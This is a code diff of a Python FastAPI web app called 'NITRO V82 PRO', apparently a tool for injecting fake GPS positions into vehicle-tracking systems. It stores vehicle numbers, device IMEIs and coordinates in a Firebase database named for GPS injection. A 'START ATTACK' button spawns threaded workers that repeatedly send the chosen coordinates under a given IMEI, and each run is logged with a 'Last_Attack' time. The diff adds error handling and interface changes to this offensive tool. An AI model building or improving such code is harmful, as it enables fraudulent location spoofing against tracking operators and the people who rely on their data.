@@ -9,14 +9,17 @@ from firebase_admin import credentials, db
 
 app = FastAPI()
 
-# --- FIREBASE SETUP (FIXED URL) ---
+# --- 1. FIREBASE HANDSHAKE (FIXED PATH) ---
 try:
     cred = credentials.Certificate("serviceAccountKey.json")
     firebase_admin.initialize_app(cred, {
         'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com'
     })
+    # Connection Check
+    test_ref = db.reference('Data_Records')
+    print("✓ FIREBASE_CONNECTED: SUCCESS")
 except Exception as e:
-    print(f"Firebase Error: {e}")
+    print(f"✗ FIREBASE_ERROR: {e}")
 
 # --- GLOBAL SETTINGS ---
 firing = False
@@ -31,7 +34,7 @@ def format_coord(val):
         return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
     except: return val
 
-# --- ENGINE: SEQUENTIAL TURBO (LOCKED) ---
+# --- ENGINE (LOCKED) ---
 def handshake_worker(tag_list, imei, vno, lat, lon):
     global firing, total_sent, logs
     while firing:
@@ -52,20 +55,16 @@ def handshake_worker(tag_list, imei, vno, lat, lon):
                 time.sleep(0.1)
             except: time.sleep(1)
 
-# --- API ENDPOINTS (FIXED PATHS) ---
+# --- API ENDPOINTS (DATA SYNC) ---
 @app.get("/fetch_data")
 def fetch_data(vno: str):
-    """Path: /Data_Records/{VNO}"""
     vno_clean = vno.upper().strip()
-    ref = db.reference('Data_Records').child(vno_clean)
-    res = ref.get()
-    if res:
-        return {
-            "found": True, 
-            "imei": res.get('IMEI_No', ''), 
-            "lat": res.get('Lat', ''), 
-            "lon": res.get('Lon', '')
-        }
+    try:
+        ref = db.reference('Data_Records').child(vno_clean)
+        res = ref.get()
+        if res:
+            return {"found": True, "imei": res.get('IMEI_No',''), "lat": res.get('Lat',''), "lon": res.get('Lon','')}
+    except: pass
     return {"found": False}
 
 @app.get("/init")
@@ -74,17 +73,20 @@ def init(v:str, i:str, lt:str, ln:str):
     if not firing:
         v_up = v.upper().strip()
         firing, total_sent = True, 0
-        logs = ["<span style='color:#fff'>[SYSTEM] HANDSHAKE STARTED...</span>"]
+        logs = ["<span style='color:#fff'>[SYS] LOGGING TO DATABASE...</span>"]
         
-        # SAVE TO DB
-        db.reference('Data_Records').child(v_up).update({
-            'Vehicle_No': v_up, 'IMEI_No': i, 'Lat': lt, 'Lon': ln,
-            'Status': 'Active', 'Last_Attack': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
-        })
-        
+        # Point: Database Save
+        try:
+            db.reference('Data_Records').child(v_up).update({
+                'Vehicle_No': v_up, 'IMEI_No': i, 'Lat': lt, 'Lon': ln,
+                'Status': 'Active', 'Last_Attack': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
+            })
+            logs.append("<span style='color:#deff9a'>[SYS] DB_SYNC: OK</span>")
+        except Exception as e:
+            logs.append(f"<span style='color:#f00'>[ERR] DB_FAIL: {str(e)[:20]}</span>")
+
         chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
-        for c in chunks:
-            threading.Thread(target=handshake_worker, args=(c, i, v_up, lt, ln), daemon=True).start()
+        for c in chunks: threading.Thread(target=handshake_worker, args=(c, i, v_up, lt, ln), daemon=True).start()
     return {"ok": True}
 
 @app.get("/stop")
@@ -95,7 +97,7 @@ def stop():
 @app.get("/status")
 def status(): return {"c": total_sent, "l": logs}
 
-# --- UI INTERFACE ---
+# --- GUI ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
@@ -103,28 +105,24 @@ async def home():
     body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
     .box { width:420px; border:1px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; background:rgba(0,10,0,0.95); border-radius:10px; }
     label { font-size:11px; display:block; margin-top:12px; color:#aaa; text-transform:uppercase; }
-    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; text-transform:uppercase; font-family:monospace; }
+    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; text-transform:uppercase; }
     .btn-row { display:flex; gap:10px; margin-top:20px; }
-    button { flex:1; padding:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; text-transform:uppercase; }
+    button { flex:1; padding:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
     button:hover { background:#0f0; color:#000; }
     #log { height:160px; background:#000800; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:11px; overflow-y:auto; }
-    .reset { border-color:#ff0; color:#ff0; width:100%; margin-top:10px; font-size:10px; padding:8px; }
     </style></head><body>
     <div class="box">
         <h2 style="text-align:center;margin:0;letter-spacing:3px;">NITRO V82 PRO</h2>
         <label>> VEHICLE NUMBER</label>
         <input type="text" id="v" oninput="this.value=this.value.toUpperCase()" onblur="fetchData()" placeholder="BR01XXXXXX">
         <label>> IMEI NUMBER</label>
-        <input type="text" id="i" placeholder="15 DIGITS">
+        <input type="text" id="i">
         <div style="display:flex; gap:10px;">
             <div style="flex:1"><label>> LATITUDE</label><input type="text" id="lt"></div>
             <div style="flex:1"><label>> LONGITUDE</label><input type="text" id="ln"></div>
         </div>
-        <div class="btn-row">
-            <button onclick="st()">START ATTACK</button>
-            <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button>
-        </div>
-        <button onclick="location.reload()" class="reset">SYSTEM RESET</button>
+        <div class="btn-row"><button onclick="st()">START ATTACK</button><button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button></div>
+        <button onclick="location.reload()" style="width:100%;margin-top:10px;color:#ff0;border-color:#ff0;padding:8px;font-size:10px;background:none;border:1px solid;">SYSTEM RESET</button>
         <div id="log">READY...</div>
         <div style="margin-top:10px; display:flex; justify-content:space-between; font-weight:bold;">
             <span>SENT: <b id="c" style="color:#fff">0</b></span>
@@ -141,7 +139,7 @@ async def home():
                         document.getElementById('i').value = d.imei;
                         document.getElementById('lt').value = d.lat;
                         document.getElementById('ln').value = d.lon;
-                        document.getElementById('log').innerHTML = "<span style='color:#fff'>[DB] DATA RETRIEVED SUCCESSFULLY</span>";
+                        document.getElementById('log').innerHTML = "[DB] DATA FETCHED SUCCESS";
                     }
                 });
             }
